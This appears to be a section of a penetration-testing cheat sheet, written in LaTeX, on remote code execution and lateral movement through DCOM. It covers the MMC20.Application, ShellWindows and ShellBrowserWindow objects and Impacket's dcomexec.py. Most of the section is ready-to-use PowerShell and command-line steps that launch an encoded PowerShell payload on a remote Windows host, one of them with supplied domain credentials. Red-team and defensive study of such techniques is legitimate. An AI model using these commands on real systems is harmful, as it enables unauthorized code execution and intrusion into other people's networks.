\section{Remote code execution / pivoting}

\subsection{DCOM objects}

\subsubsection{MMC20}

The \verb+MMC20.Application+ object allows remote interaction with Microsoft Management Console (MMC), enabling us to execute commands and manage administrative tasks on a Windows system through its graphical user interface components.

\begin{itemize}
    \item create an instance of the \verb+MMC20.Application+ COM object on target server using PowerShell:
        \begin{itemize}
            \item  .NET \href{https://learn.microsoft.com/fr-fr/dotnet/api/system.activator?view=net-8.0}{Activator} class's \href{https://learn.microsoft.com/fr-fr/dotnet/api/system.activator.createinstance?view=net-8.0}{CreateInstance} method to initialize
            \item  .NET \href{https://learn.microsoft.com/fr-fr/dotnet/api/system.type?view=net-8.0}{Classe} class's \href{https://learn.microsoft.com/fr-fr/dotnet/api/system.type.gettypefromprogid?view=net-8.0}{GetTypeFromProgID} method retrieves the type information for the MMC20.Application based on its ProgID
        \end{itemize}
    \item \href{https://learn.microsoft.com/en-us/previous-versions/windows/desktop/mmc/view-executeshellcommand}{ExecuteShellCommand} within the Document.ActiveView property
\end{itemize}
    


\begin{verbatim}
$mmc = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","<target_ip>"));
$mmc.Document.ActiveView.ExecuteShellCommand("powershell.exe",$null,"-e <encoded_payload>",0)
\end{verbatim}


\subsubsection{ShellWindows and ShellBrowserWindows}

\href{https://learn.microsoft.com/en-us/windows/win32/shell/shellwindows?redirectedfrom=MSDN}{ShellWindows} and \verb+ShellBrowserWindow+ objects in DCOM are very similar, they facilitate remote interaction with Windows Explorer instances.
\begin{itemize}
    \item \verb+ShellWindows+ allows enumeration and control of open windows, enabling operations such as accessing files and executing commands within the Windows shell environment. 
    \item \verb+ShellBrowserWindow+ provides specific control over browser windows within Windows Explorer, offering capabilities for managing file operations and executing commands remotely.
\end{itemize}

Since these objects aren't associated with a ProgID, \verb+Type.GetTypeFromCLSID+ method in .NET along with \verb+Activator.CreateInstance+ must be used to create an instance of the object via its CLSID on a remote host. We can find the CLSID with the following script:

\begin{verbatim}
Get-ChildItem -Path 'HKLM:\SOFTWARE\Classes\CLSID' |
    ForEach-Object{Get-ItemProperty -Path $_.PSPath |
         Where-Object {$_.'(default)' -eq 'ShellWindows'} |
         Select-Object -ExpandProperty PSChildName}

$shell = [activator]::CreateInstance([type]::GetTypeFromCLSID("<GUID>","<target_netbios>"))
$shell[0].Document.Application.ShellExecute("cmd.exe","/c powershell -e <encoded_payload>","C:\Windows\System32",$null,0)
\end{verbatim}


\subsection{Windows tools}

\subsubsection{SharpLateral}

\href{https://github.com/mertdas/SharpLateral}{SharpLateral}

\subsubsection{dcomexec.py}

\begin{verbatim}
dcomexec.py -object MMC20 <domain_netbios>/<user>:<password>@<ip> "powershell -e <encoded_payload>" -silentcommand
\end{verbatim}

Note: In case the TCP port 445 is not available, we can use the option -no-output. This will disable the output and it won't try to use port 445 for connections.

\subsection{Links}
\begin{itemize}
    \item \href{https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/}{Lateral Movement using the MMC20.Application COM Object}
    \item \href{https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/}{Lateral Movement via DCOM: Round 2}
\end{itemize}